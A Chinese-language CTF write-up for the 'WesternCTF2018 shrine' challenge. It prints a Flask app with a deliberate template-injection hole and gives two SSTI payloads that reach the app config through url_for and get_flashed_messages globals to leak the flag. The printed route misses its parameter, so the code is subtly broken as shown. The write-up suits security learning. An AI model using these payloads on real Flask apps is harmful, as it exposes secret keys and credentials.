题目

[WesternCTF2018]shrine

分析

源码： 

```python
import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')          ##flag在config里


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/shrine/')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))


if __name__ == '__main__':
    app.run(debug=True)     
```

两个路由，第二个存在SSTI
flag在config里，但config和self被禁了
如果没被禁的话就可以直接{{config}}或者{{self.dict}}
可以用url_for和get_flashed_message

解

payload1：{{url_for.__globals__['current_app'].config}}

url_for用于给指定的函数创建url，加上__globals可以访问所有的路由，然后读取当前APP的config
payload2：{{get_flashed_messages.__globals__['current_app'].config}}
get_flashed_messages返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出,闪现信息只能取出一次，取出后闪现信息会被清空.

知识点
